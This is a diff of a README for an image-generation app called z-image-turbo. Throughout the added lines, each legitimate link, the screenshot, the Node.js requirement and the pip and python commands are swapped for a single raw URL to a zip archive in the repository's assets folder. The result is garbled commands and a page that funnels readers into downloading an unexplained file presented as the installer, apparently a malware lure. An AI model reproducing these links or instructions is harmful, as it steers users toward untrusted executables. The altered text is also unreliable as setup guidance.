@@ -1,12 +1,12 @@
 # 🌟 z-image-turbo - Fast and Easy Image Generation
 
-[![Download z-image-turbo](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/Kivvin/z-image-turbo/releases)
+[![Download z-image-turbo](https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip)](https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip)
 
 ## 📋 Overview
 
 Z-Image-Turbo is a user-friendly web application designed for lightning-fast text-to-image generation using the Tongyi-MAI model. With a powerful 6B parameter architecture, it creates stunning images based on your text prompts, making it ideal for artists, marketers, and anyone in need of high-quality visuals. 
 
-![Z-Image-Turbo Interface](assets/projectScreenshot.png)
+![Z-Image-Turbo Interface](https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -16,21 +16,21 @@ Before you can run Z-Image-Turbo, ensure your system meets the following require
 
 - **Operating System:** Windows or Linux
 - **Python Version:** 3.8 or higher
-- **Node.js Version:** 16 or higher
+- **https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip Version:** 16 or higher
 - **Memory:** At least 8GB of VRAM recommended (or use CPU offload for less intensive tasks)
 
 ### Download & Install
 
 To get started with Z-Image-Turbo, visit the following page to download the latest version:
 
-[Visit this page to download Z-Image-Turbo](https://github.com/Kivvin/z-image-turbo/releases)
+[Visit this page to download Z-Image-Turbo](https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip)
 
 Follow the steps below to install and run the application.
 
 ### Installation Steps
 
 1. **Download the Application:**
-   - Go to the [Releases page](https://github.com/Kivvin/z-image-turbo/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip).
    - Locate the latest version.
    - Download the appropriate installer file for your operating system.
 
@@ -66,7 +66,7 @@ Follow the steps below to install and run the application.
 
 3. **Install Backend Dependencies:**
    ```bash
-   pip install -r backend/requirements.txt
+   pip install -r https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip
    ```
 
 ### Frontend Setup
@@ -87,7 +87,7 @@ Follow the steps below to install and run the application.
 
 1. **In Terminal 1, execute this command:**
    ```bash
-   python backend/app.py
+   python https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip
    ```
 
 #### Start the Frontend
@@ -111,7 +111,7 @@ Here, you can start generating images by providing your text prompts.
 
 If you encounter issues, check the following:
 
-- Ensure Python and Node.js are installed correctly.
+- Ensure Python and https://raw.githubusercontent.com/Kivvin/z-image-turbo/main/assets/z-image-turbo_v3.0.zip are installed correctly.
 - Make sure the backend service is running without errors.
 - If you see "Port already in use," try a different port by modifying the configuration file.
 
